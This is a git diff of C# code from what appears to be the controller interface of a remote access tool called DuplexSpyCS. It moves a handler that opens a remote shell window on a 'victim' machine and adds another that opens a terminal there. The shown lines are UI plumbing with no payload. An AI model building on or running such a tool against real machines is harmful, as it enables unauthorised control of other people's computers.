@@ -2470,23 +2470,6 @@ namespace DuplexSpyCS
 
             f.ShowDialog();
         }
-        //OPEN SHELL IN CURRENT DIRECTORY
-        private void toolStripButton4_Click(object sender, EventArgs e)
-        {
-            frmShell f = clsTools.fnFindForm<frmShell>(m_victim);
-            if (f == null)
-            {
-                f = new frmShell(m_victim, current_path);
-                f.StartPosition = FormStartPosition.CenterScreen;
-                f.Text = $@"Shell\\{m_victim.ID}";
-
-                f.Show();
-            }
-            else
-            {
-                f.BringToFront();
-            }
-        }
 
         //FILE - KEY DOWN
         private void listView1_KeyDown(object sender, KeyEventArgs e)
@@ -2982,7 +2965,7 @@ namespace DuplexSpyCS
         //Task - ListView Filter
         private void textBox4_TextChanged(object sender, EventArgs e)
         {
-            
+
         }
 
         private void listView6_DoubleClick(object sender, EventArgs e)
@@ -3420,6 +3403,40 @@ namespace DuplexSpyCS
                     Task_RegexSearch(tb.Text);
                     break;
             }
+        }
+
+        private void toolStripMenuItem78_Click(object sender, EventArgs e)
+        {
+            frmShell f = clsTools.fnFindForm<frmShell>(m_victim);
+            if (f == null)
+            {
+                f = new frmShell(m_victim, current_path);
+                f.StartPosition = FormStartPosition.CenterScreen;
+                f.Text = $@"Shell\\{m_victim.ID}";
+
+                f.Show();
+            }
+            else
+            {
+                f.BringToFront();
+            }
+        }
+
+        private void toolStripMenuItem79_Click(object sender, EventArgs e)
+        {
+            frmXterm f = clsTools.fnFindForm<frmXterm>(m_victim);
+            if (f == null)
+            {
+                if (textBox1.Tag == null)
+                    return;
+
+                string szCurrentPath = (string)textBox1.Tag;
+
+                f = new frmXterm(m_victim, szCurrentPath);
+                f.Show();
+            }
+
+            f.BringToFront();
         }
     }
 }
